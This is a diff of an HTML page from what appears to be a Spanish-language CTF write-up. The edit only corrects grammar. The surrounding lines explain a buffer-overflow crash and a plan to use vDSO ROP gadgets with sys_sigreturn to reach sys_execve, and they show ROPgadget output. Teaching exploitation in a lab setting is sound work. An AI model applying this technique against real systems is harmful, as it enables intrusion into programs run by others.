@@ -173,7 +173,7 @@ Where to go, challenger? your fractured reflection is your only guide.
 Where to go, challenger? your fractured reflection is your only guide.
 &gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Segmentation fault
-</pre></code></div><h2 id="estrategia-de-explotación">Estrategia de explotación</h2><p>No podemos reutilizar las instrucciones del binario para obtener ejecución del código arbitrario usando ROP. Pero hay más regiones de memoria cargadas en el programa:</p><div class="highlight"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+</pre></code></div><h2 id="estrategia-de-explotación">Estrategia de explotación</h2><p>No podemos reutilizar las instrucciones del binario para obtener ejecución de código arbitrario usando ROP. Pero hay más regiones de memoria cargadas en el programa:</p><div class="highlight"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
 <span class="code-green">root@arena</span>:<span class="code-blue">/</span># /target &
 <span class="code-green">root@arena</span>:<span class="code-blue">/</span># Where to go, challenger? your fractured reflection is your only guide.
 &gt;
@@ -203,7 +203,7 @@ ZJqelnRb4NxPQe/5Gdr78vjy+PL48vh7Pv4CVkquWAAgAAA=
 
 <span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">vdso</span>
 vdso: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, BuildID[sha1]=3217528fe99bd85fcb961d07aa790af666c989c7, stripped
-</pre></code></div><p>En este archivo binario, podemos encontrar más dispositivos ROP.</p><p>El mejor enfoque es usar <code>sys_sigreturn</code>, porque permite establecer todos los registros usando un <em>stack frame</em>. Como resultado, podríamos establecer todos los registros y dejarlos listos para ejecutar <code>sys_execve</code> y obtener ejecución del código arbitrario. Obsérvese que ya tenemos <em>gadgets</em> ROP que ejecutan un <code>sys_sigreturn</code> (<code>$eax = 0x77</code>), porque se usa para cambiar a modo kernel:</p><div class="highlight"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+</pre></code></div><p>En este archivo binario, podemos encontrar más dispositivos ROP.</p><p>El mejor enfoque es usar <code>sys_sigreturn</code>, porque permite establecer todos los registros usando un <em>stack frame</em>. Como resultado, podríamos establecer todos los registros y dejarlos listos para ejecutar <code>sys_execve</code> y obtener ejecución de código arbitrario. Obsérvese que ya tenemos <em>gadgets</em> ROP que ejecutan un <code>sys_sigreturn</code> (<code>$eax = 0x77</code>), porque se usa para cambiar a modo kernel:</p><div class="highlight"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
 <span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">vdso</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">'int 0x80'</span>
 0x0000058e : add byte ptr [eax + 0x77b858], dl ; add byte ptr [eax], al ; <span class="code-red">int 0x80</span>
 0x0000059f : add byte ptr [eax + 0xad], bh ; <span class="code-red">int 0x80</span>
